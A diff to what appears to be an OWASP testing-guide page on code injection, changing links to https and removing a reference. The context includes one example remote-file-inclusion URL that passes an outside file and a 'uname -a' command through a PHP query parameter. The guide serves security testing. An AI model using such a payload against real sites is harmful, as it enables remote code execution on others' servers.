@@ -23,7 +23,7 @@ In [Code Injection](https://owasp.org/www-community/attacks/Code_Injection) test
 
 Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file:
 
-`http://www.example.com/uptime.php?pin=http://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`
+`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`
 
 > The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.
 
@@ -62,7 +62,6 @@ End If
 
 ### References
 
-- [Security Focus](http://www.securityfocus.com)
-- [Insecure.org](http://www.insecure.org)
-- [Wikipedia](http://www.wikipedia.org)
+- [Insecure.org](https://insecure.org/)
+- [Wikipedia](https://www.wikipedia.org)
 - [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/OS_Injection)
